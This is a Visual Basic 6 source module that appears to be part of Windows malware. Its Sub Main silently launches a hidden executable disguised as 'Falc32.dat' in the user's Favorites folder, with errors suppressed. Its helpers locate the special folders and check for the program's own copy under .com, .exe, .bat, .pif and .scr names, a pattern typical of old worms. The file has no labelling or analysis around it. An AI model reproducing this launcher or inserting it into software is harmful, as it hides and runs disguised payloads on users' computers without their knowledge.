Attribute VB_Name = "Module1"
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Const MAX_PATH = 255

Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long

Private Declare Function SHGetSpecialFolderLocation Lib "shell32.dll" (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long
Private Declare Function SHGetPathFromIDList Lib "shell32.dll" Alias "SHGetPathFromIDListA" (ByVal pidl As Long, ByVal pszPath As String) As Long

Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long

Private Type SHITEMID
    cb As Long
    abID As Byte
End Type

Private Type ITEMIDLIST
    mkid As SHITEMID
End Type

Public Const Dsk% = 0
Public Const Prg% = 2
Public Const Doc% = 5
Public Const Fav% = 6
Public Const Str% = 7
Public Const Rec% = 8
Public Const Snd% = 9
Public Const Stm% = 11
Public Const Msc% = 13
Public Const Vid% = 14
Public Const Nsh% = 19
Public Const Fts% = 20
Public Const Tpl% = 21
Public Const Pdp% = 23
Public Const Pds% = 24
Public Const Roa% = 26
Public Const Loc% = 28
Public Const Prd% = 35
Public Const Win% = 36
Public Const Sys% = 37
Public Const Pic% = 39
Public Const Usr% = 40
Public Const Sw6% = 41
Public Const Res% = 56

Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function SetWindowText Lib "user32" Alias "SetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String) As Long
Private Const WM_CLOSE = &H10
Sub Main()
On Error Resume Next
Shell UF(Fav) + "Falc32.dat", vbHide
End Sub
Public Function SF(ByVal lFold As Byte) As String
On Error Resume Next
Dim Bf$, Ret&

    Select Case lFold
    
        Case 0
        Bf = String$(MAX_PATH, Chr$(0))
        Ret = GetWindowsDirectory(Bf, MAX_PATH)
        SF = Mid$(Bf, 1, InStr(Bf, Chr$(0)) - 1)
        SF = VAL_PATH(SF)

        Case 1
        Bf = Space$(MAX_PATH)
        Ret = GetSystemDirectory(Bf, MAX_PATH)
        SF = Mid$(Bf, 1, InStr(Bf, Chr$(0)) - 1)
        SF = VAL_PATH(SF)

        Case 2
        Bf = String$(MAX_PATH, Chr$(0))
        Ret = GetTempPath(MAX_PATH, Bf)
        SF = Mid$(Bf, 1, InStr(Bf, Chr$(0)) - 1)
        SF = VAL_PATH(SF)
        
        Case 3
        Dim Ext
        Ext = Array(".com", ".exe", ".bat", ".pif", ".scr")
            For i = 0 To UBound(Ext)
                If FILE_EXISTS(GET_NAME(PE) & Ext(i)) Then
                    SF = GET_NAME(PE) & Ext(i)
                    End If
            Next
        
        Case 4
        SF = Environ$("SYSTEMDRIVE")
        SF = VAL_PATH(SF)
        
    End Select
End Function
Public Function VAL_PATH(ByVal lPath As String) As String
On Error Resume Next: Dim A$
If Len(lPath) > 5 Then
    If Right(lPath, 1) <> "\" Then VAL_PATH = lPath + "\"
    If Right(lPath, 1) = "\" Then VAL_PATH = lPath
    ElseIf Len(lPath) < 5 Then
        If Right$(lPath, 1) <> "\" Then
            VAL_PATH = lPath + "\"
            End If
        If Right$(lPath, 1) = ":" Then
            VAL_PATH = lPath + "\"
            End If
        A = Right$(lPath, 1)
        If Left(A, 1) <> ":" Then
            VAL_PATH = lPath + ":\"
            End If
    End If
End Function
Public Function UF(ByVal lFolder As Byte) As String
On Error Resume Next
Dim Rt      As Long
Dim IDL     As ITEMIDLIST

Rt = SHGetSpecialFolderLocation(100, lFolder, IDL)
       Path$ = Space$(512)
       Rt = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal Path$)
       UF = Left$(Path, InStr(Path, Chr$(0)) - 1)
       UF = VAL_PATH(UF)
       Exit Function
End Function
Private Function PE() As String
On Error Resume Next
Dim MDF     As Long
Dim Bf      As String

Bf = Space$(MAX_PATH)

MDF = GetModuleFileName(0&, Bf, MAX_PATH)

PE = Left(Bf, InStr(Bf, Chr$(0)) - 1)
End Function
Public Function FILE_EXISTS(ByVal lFile As String) As Boolean
On Error Resume Next

FILE_EXISTS = IIf(Dir(lFile, vbArchive + vbHidden + vbNormal _
+ vbSystem) <> "", True, False)

End Function
Public Function GET_NAME(ByVal lFile As String) As String
On Error Resume Next

GET_NAME = Left$(lFile, InStr(lFile, ".") - 1)

End Function


